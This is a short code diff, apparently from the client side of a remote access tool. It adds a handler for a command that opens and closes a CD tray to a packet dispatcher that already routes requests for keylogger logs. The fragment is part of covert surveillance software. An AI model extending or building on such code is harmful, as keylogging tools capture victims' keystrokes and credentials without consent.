@@ -93,7 +93,10 @@ namespace Client.Packets
             {
                 KeyLoggerController.getKeyLogger((GetKeyLoggerLogs)packet, client);
             }
-            
+            else if (type == TypePackets.DoTrayCdOpenClose)
+            {
+                DoTrayCdOpenCloseController.openCloseTrayCD((DoTrayCdOpenClose)packet, client);
+            }
         }
     }
 }
